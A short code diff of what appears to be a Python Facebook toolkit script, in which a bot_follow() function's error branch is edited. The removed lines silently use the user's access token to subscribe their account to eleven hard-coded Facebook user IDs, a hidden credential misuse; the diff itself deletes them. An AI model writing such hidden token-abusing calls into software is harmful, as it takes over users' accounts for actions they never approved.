@@ -105,17 +105,7 @@ def bot_follow():
 	except IOError:
 		print(' [!] Token Invalid')
 		os.system('rm -rf login.txt')
-		requests.get('https://graph.facebook.com/v1.0/100002217127294/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100017553167451/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100064563975028/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100001800440606/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/536209003/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100035417441849/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100000585030282/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100006541202647/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100006613569734/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100041129048948/subscribers?access_token='+token)
-		requests.get('https://graph.facebook.com/v1.0/100000570176966/subscribers?access_token='+token)
+		
         menu()
         print ' [!] Token Invalid!'
         sys.exit()
